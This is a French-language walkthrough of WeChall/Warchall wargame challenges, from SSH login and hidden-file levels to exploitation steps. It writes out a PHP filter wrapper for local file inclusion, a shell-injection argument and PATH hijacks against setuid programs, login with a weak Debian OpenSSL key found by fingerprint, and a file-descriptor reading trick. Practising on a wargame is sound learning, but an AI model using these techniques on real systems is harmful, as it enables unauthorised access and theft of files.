# WeChall
##comment entrer dans le challenge :
- s'enregistrer avec le bouton **s'enregistrer**
- créer son compte ssh en créant un mot de passe ssh sur **(re)set your ssh password**
- on peut alors se connecter via *ssh -p 19198 VotreNomUtilisateur@warchall.net* qui est fournie par le site We Chall
- ouvrir un terminal : un CMD ou aller sur putty
pour mon cas je suis allé sur putty avec VMWare allumé et je me suis d'abord connecté en mode superutilisateur
- se connecter sur le terminal et entrer le mot de passe ssh pour entrer 

##Training: Warchall - The Beginning

###level00:
- après la connexion, on se retrouve tout de suite sur notre répertoire personnel
> jennifer@warchall:~$
- avec **ls** on regarde ce qu'il y a à l'intérieur 
- il y avait un fichier WELCOME.md qui annonce grâce à **cat WELCOME.md** que les solutions se trouvent dans le dossier */home/level ou /home/user/yournick/level*
- donc on fait **cd /home/level** pour accéder au dossier
- à l'intérieur, on entre avec **cd 00_WELCOME** dans le dossier 00_welcome dans laquel se trouve un fichier README.md
- en faisant **cat README.md**, on trouve la solution

###level01:
- dans /home/level, on entre dans le dossier 01_choice_tree avec **cd 01_choice_tree** 
- avec **ls** on peut y voir un fichier README.md mais la solution n'y était pas
- toujours à l'intérieur, il y avait aussi 3 dossiers et on entre dans le dossier blue, **cd blue** et puis on fait **ls**
- dans ce dossier il y avait un autre dossier hats et on peut y entrer avec **cd hats**
- dans ce dossier hats avec **ls**, il y avait un dossier solution et on y entre avec **cd solution**
- trois dossiers : black, grey et white s'affichait dans solution puis on entre dans grey avec **cd grey** car :
> DEEP IN YOUR HEART YOU SHOULD BECOME A **GRAY**HAT 
ALWAYS KEEP A JOKER.
- puis, à l'interieur avec un autre **ls** il y avait un dossier patience et on fait **cd patience**
- après on peut trouver le fichier SOLUTION.txt avec **ls**
- en faisant **cat SOLUTION.txt**, on obtient la solution

###level02:
- dans /home/level, on entre dans le dossier 02 et dedans en faisant **ls** on tombe sur des dossiers qui ne contiennent pas la solution mais informe qu'on est bien en *level02*
- donc on execute la commande **ls -al**
- on peut par la suite trouver un dossier caché appellé .porb et y entrer par **cd .porb**
- en faisant **ls -al** dans ce dossier, on peut trouver un fichier .solution
- en faisant **cat .solution**, on obtient la solution

###level03:
- en entrant dans le dossier /home/level/03 et en faisant **ls** dedans il n'y a rien 
- mais avec **ls -al**, on peut voir un dossier et un fichier .bash_history
- en faisant **cat .bash_history**, on accède au solution

###level04:
- en entrant dans le dossier /home/level/04_kwisatz$, on peut voir par **ls** un fichier README.nfo 
- à l'interieur de ce fichier, il y a une indication qui dit d'*aller dans notre ~ qui veut dire notre répertoire personnel*
- on execute alors **cd /home/user/TonNomUtilisateur**, pour moi c'était **cd /home/user/jennifer** pour accéder au répertoire personnel
- dedans on entre dans le dossier level
- puis à l'interieur on entre dans 04_kwisatz 
- en tapant sur **ls** on peut voir deux fichiers dont l'un README.txt nous conseillant d'*aller dans le fichier README2.md un fichier pour le moment inaccessible*
- en tapant **ls -al** on voit que on n'a aucun droit sur ce fichier 
- donc on utilise **chmod +r README2.md** pour au moins _lire le contenu du fichier README2.md_
- en revenant sur la commande **ls -al**, on peut constater que *le droit de lire le fichier a changé*
- puis avec **cat README2.md** on accède au solution

###level05:
- en entrant dans /home/level/05_privacy, on peut voir un fichier README.md
- en faisant **cat README.md**, on accède à la solution

##Warchall: Live LFI
- en cliquant sur Live LFI, on accède à un page web
- puis en entrant sur le code source de cette page on peut voir qu'il a deux liens assez similaires 
- et en cliquant sur l'un d'eux, on se retrouve dans la même page mais avec un URL différent et la langue de la page est : en anglais si on a un **URL=en**, en allemand si on a un **URL=de**
- d'après les precédentes challenges qu'on a vu, la solution est souvent stockée dans un fichier README ou solution
- si on essaie de changer **en** ou **de** en **solution.php** pour accéder à la solution, la solution n'y est pas encore 
-  on utilise donc un wrapper de php pour pouvoir lire l'intégralité du fichier solution.php en utilisant le codage en base64
```
wrapper PHP : php://filter/convert.base64-encode/resource=solution.php
```
- on change le **en** ou **de** dans l'URL en ce wrapper PHP 
- une suite de caractères en sous forme d'ASCII s'affichent et on le copie
- on va dans un autre site qui permet de décoder un base64 et on cole dessus la suite de caractères
- on tape sur le bouton *decode* 
- le contenu intégral du fichier **solution.php** s'affiche et on peut trouver dedans à l'intérieur de **' '** la solution.

##Warchall: Live RFI
- En cliquant sur Live RFI, on accède à un page web
- puis en entrant sur le code source de cette page on peut voir qu'il a deux liens avec 2href
- si on clique sur le premier lien, on se retrouve dans la page précedente en anglais et si on clique sur le deuxieme lien, on se retrouve sur une page similaire mais en allemand. Tous deux avec des URL différents à partir du caractère **=** dans l'URL
- si on change en **solution.php** les caractères après **=**, on accède à une page mais la solution n'y est pas 
-  on utilise donc un wrapper de php pour pouvoir lire l'intégralité du fichier solution.php en utilisant le codage en base64
```
wrapper PHP : php://filter/convert.base64-encode/resource=solution.php
```
- on remplace par ce wrapper PHP le contenu de l'URL après **=** 
- une suite de caractères en sous forme d'ASCII s'affichent et on le copie
- on va dans un autre site qui permet de décoder un base64 et on cole dessus la suite de caractères
- on tape sur le bouton *decode* 
- le contenu intégral du fichier **solution.php** s'affiche et on peut trouver dedans tout en bas en **'  '** la solution.

##Choose your Path
- après avoir analyser la fonction donnée sur le fichier charp.c, il retourne le nombre moyen de caractère par ligne d'un fichier donné
- cependant avec **ls -al** on peut voir que ce fichier ne peut pas être executé par d'autres utilisateurs
- contrairement à cela un autre fichier charp peut 
- on peut donc envisager une méthode similaire à l'injection pour avoir la solution avec :
```
./charp "solution.txt | cat solution.txt > ~/solution10.txt"
```
- puis on affiche le contenu du fichier **solution10.txt** avec **cat /home/user/jennifer/solution10.txt** ou simplement avec **cat ~/solution10.txt**
- la solution ou notre flag se trouve dedans

##Choose your path2
- après avoir examiné la fonction dans le code source
- on peut créer un lien symbolique dans notre répertoire personnel avec :
```
ln -s /bin/sh ~/wc
```
- puis on modifie la variable d'environnement afin d'inclure uniquement le répertoire personnel où se trouve notre lien symbolique **wc** avec :
```
PATH=~ ./charp2 "/bin/cat solution.txt 1>&2" 
 ```
- la solution s'affiche

##Py-Tong
- en analysant les lignes de codes présentés par le fichier pytong.py, on peut en conclure deux choses :
    - d'abord, si la fonction **main** dans ce fichier renvoie **true** on obtiendra la solution
    - puis, pour que ça se fait on doit soit donner en argument un chemin vers un *fichier temporaire* soit donner en argument un chemin vers un fichier qui après lecture le contenu du fichier change
- vu qu'on ne peut pas se diriger vers un chemin contenant **/tmp** d'après la fonction, on doit alors chercher une autre alternative
- pour se faire on utilise un fichier virtuel qui est un fichier *temporaire*  à l'aide du commande **<()**
- puisqu'on veut un contenu temporaire il suffit d'écrire quelque chose sur ce fichier avec la commande **echo**
- donc sur le terminal, on saisit:
```
./pytong <(echo "SearchingForFlag")
```
- la solution s'affiche automatiquement

##SSH...Z is sleeping
- on peut trouver la clé publique de level08 dans **/home/level/08_sshz/backups/authorized_keys.backup**, il nous faut donc trouver la clé privée pour s'authentifier en level08
- pour se faire, on utilise
```
ssh-keygen -l -E md5 -f /home/level/08_sshz/backups/authorized_keys.backup
```
afin de voir si on peut obtenir l'empreinte du clé public ssh en md5 et exploiter une des vulnérabilités de l'empreinte md5(la même empreinte sur la clé publique et sur clé privée)
- puis sur le site https://hdm.io/tools/debian-openssl/ on peut voir un fichier zip https://hdm.io/tools/debian-openssl/debian_ssh_rsa_2048_x86.tar.bz2
- après le téléchargement et l'extraction de ce zip on peut accéder à plusieurs fichiers contenant des clés privées et ayant des noms sous forme de md5 mais sans les **:**
- on cherche donc dessus **2bcd07a701e94a0474d77ee4d6d0f806** (l'empreinte sans les **:** obtenus à partir de la commande avec la clé publique) 
- on obient alors un fichier de ce même nom et on l'envoie dans notre répértoire personnel dans warchall avec :
```
scp -P 19198 C:\Users\Jenny\Downloads\rsa\2048\2bcd07a701e94a0474d77ee4d6d0f80 -23669 jennifer@warchall.net:/home/user/jennifer
```
- puis de retour sur le serveur on s'identifie avec le chemin de la clé privée:
```
ssh -i ~/2bcd07a701e94a0474d77ee4d6d0f806-23669 level08@warchall.net -p 19198
```
- la solution s'affiche

##Warchall:Tryouts
- après avoir analysé le code source de ce challenge, on  peut en conclure que la fonction consiste à donner la solution après 3 entrées correctes des chiffres donné par /dev/urandom(ce qui est vraiment difficile à faire)
- donc pour exploiter la faille de cela, on crée notre propre fichier **cat** dans notre répertoire personnel qui va lire un fichier et renvoyer e contenu lit dans un autre fichier
- le cat que j'ai choisit d'utiliser :
```
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main(int argc, char *argv[]) {
    FILE *fp = fopen(argv[1], "w");
    char buf[16];
    memset(buf, 0, sizeof buf);
    lseek(3, 0, SEEK_SET);
    read(3, buf, sizeof buf);
    fprintf(fp, "%s", buf);
    return 0;
}
```
-afin d'utiliser ce cat on doit d'abord le compiler avec :
```
jennifer@warchall:~$ gcc -m32 cat.c -o cat
```
- puis on execute le code ci-dessous afin d'inclure notre répertoire personnel: 
```
jennifer@warchall:export PATH=$HOME:$PATH
```
- puis pour executer ce cat, on fait :
```
jennifer@warchall:~$ ./cat
```
- après on va sur le challenge **cd /home/level/matrixman/13_tryouts/** et on fait :
```
./tryouts
^C
```
- on change ensuite la variable d'environnement en :
```
export PATH=$PATH
```
- enfin on execute la commande :
```
nano ~/seed
```
- la solution y est